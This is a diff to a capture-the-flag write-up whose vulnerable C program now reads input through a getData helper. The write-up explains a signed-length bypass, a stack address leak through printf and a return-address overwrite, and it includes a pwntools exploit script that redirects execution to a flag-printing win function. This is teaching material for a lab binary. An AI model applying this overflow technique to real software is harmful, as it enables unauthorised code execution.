@@ -10,6 +10,11 @@ void win() {
     system("/bin/cat flag.txt");
 }
 
+void getData(char* buf, unsigned int len) {
+    printf("enter buffer\n");
+    read(0, buf, len);
+}
+
 int main() {
     int length;
     char buf[64];
@@ -23,9 +28,8 @@ int main() {
             return 0;
         }
 
-        printf("enter buffer\n");
-        read(0, buf, (unsigned short)length);
-        printf("%s", buf);
+        getData(buf, length);
+        printf("%s\n", buf);
     }
 }
 ```
@@ -38,14 +42,14 @@ The solution has 3 parts:
 
 ### Stage 1 - sending all the data we want
 This is the easiest step. if we send -1 as length, then it will pass the test, and register as smaller than 64.
-But, the binary representation of -1 as int, is 0xffffffff, so when we convert it to unsigned short, it will be 0xffff, which equals 65535 - way more than enough to send the data we need.
+But, the binary representation of -1 as int, is 0xffffffff, so when we convert it to unsigned int during the call to getData, it will be 0xffffffff, which equals 4294967295 - way more than enough to send the data we need.
 
 ### Stage 2 - the winning address
 First, we know that the relative address of each run, of the main function and the win function are the same. we can figure those out by using objdump.
 ```bash
 objdump -d ./challenge | grep -E "win|main"
 ```
-From this, we can see that the address of win from the start of the program is 0x11c9, and the address of main is 11f7.
+From this, we can see that the address of win from the start of the program is 0x11c9, and the address of main is 1230.
 
 Before the main function starts running there are some setup functions, like _start. In _start, it calls  __libc_start_main, with the address of main as the argument of the main address - which is stored in rdi. After __libc_start_main sets up the stack, it pushes rdi to the stack, and it never pops it. This means, that during the execution of main, it's address is stored somewhere in the stack.
 the way printf works, is by reading characters from the stack, until it reaches 0x00, starting from the given address (buf). In addition, we know that the first 3 bytes of the main address will be 0x000055 or 0x000056, so if we do manage to get the address of main from the stack, printf will stop right after.
@@ -113,7 +117,7 @@ for i in range(1, 150):
     except:
         pass
 
-mainOffset, winOffset = 0x11f7, 0x11c9
+mainOffset, winOffset = 0x1230, 0x11c9
 winAddress = mainAddress - mainOffset + winOffset + 5
 print("win address: ", hex(winAddress))
 
@@ -124,4 +128,5 @@ p.sendafter(b"buffer\n", b"A" * 88 + winAddress.to_bytes(8, byteorder='little'))
 p.sendlineafter(b"length\n", b"100")
 
 p.interactive()
+
 ```
